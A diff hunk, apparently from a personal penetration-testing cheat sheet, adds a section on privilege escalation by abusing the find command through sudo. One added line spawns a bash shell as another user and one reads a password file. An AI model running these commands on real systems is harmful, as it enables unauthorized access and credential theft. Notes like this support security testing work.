@@ -43,6 +43,10 @@ Poratble Database
 |---| -- |
 |.tables| SELECT * FROM tablename;|
 
+### Privelage Escaltion abusing find command
+sudo -u user find /etc -name passwd -type f -exec bash \;
+sudo -u user find /usr/bin -name password.txt -type f -exec cat {} \;
+
 ### Create wordlist for testing opensource projects
 #### find | sed 's/\.//g' > ffufwordlist.txt
 
